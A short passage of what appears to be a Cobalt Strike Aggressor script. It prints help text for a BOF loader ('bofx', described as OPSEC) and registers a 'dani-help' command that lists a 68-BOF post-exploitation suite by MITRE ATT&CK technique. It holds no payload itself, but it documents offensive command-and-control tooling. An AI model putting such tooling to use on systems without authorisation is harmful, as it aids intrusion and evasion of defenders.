    blog($bid, "");
    blog($bid, "PHASE 6 — Loader (1 BOF)");
    blog($bid, "  bofx                     OPSEC BOF loader         <path> [entry] [args]");
    blog($bid, "");
    blog($bid, "Use 'help <command>' for full syntax and MITRE details.");
    blog($bid, "=================================================================");
}
beacon_command_register(
    "dani-help",
    "List all 68 BOFs in the Dani suite by phase and technique",
    "Synopsis: dani-help\n\n" .
    "Description: Print a structured list of all 68 BOFs available in the\n" .
    "DEF-Situational-Awareness-BOF suite, organized by phase, with MITRE\n" .
    "ATT&CK technique IDs and argument summaries.\n\n" .
    "Use 'help <command>' for full syntax and MITRE details on any BOF.\n\n" .
    "Args: none"
);
